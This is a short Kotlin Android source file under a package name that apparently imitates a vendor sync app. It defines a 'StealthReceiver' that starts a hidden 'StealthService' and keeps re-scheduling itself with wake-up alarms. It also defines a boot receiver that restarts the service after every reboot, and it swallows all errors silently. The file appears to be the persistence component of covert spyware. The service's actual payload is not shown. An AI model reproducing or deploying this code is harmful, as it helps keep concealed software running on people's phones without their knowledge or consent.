package com.vivo.sync
import android.content.*
import android.app.*

class StealthReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        try { ctx.startService(Intent(ctx, StealthService::class.java)) } catch (e: Exception) {}
        val am = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val pi = PendingIntent.getBroadcast(ctx,0,Intent(ctx, StealthReceiver::class.java), PendingIntent.FLAG_IMMUTABLE)
        try {
            am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + Config.INTERVAL_MS, pi)
        } catch (e: Exception) {
            am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + Config.INTERVAL_MS, pi)
        }
    }
}
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        if(intent.action==Intent.ACTION_BOOT_COMPLETED){ 
            try { ctx.startService(Intent(ctx, StealthService::class.java)) } catch (e: Exception) {}
        }
    }
}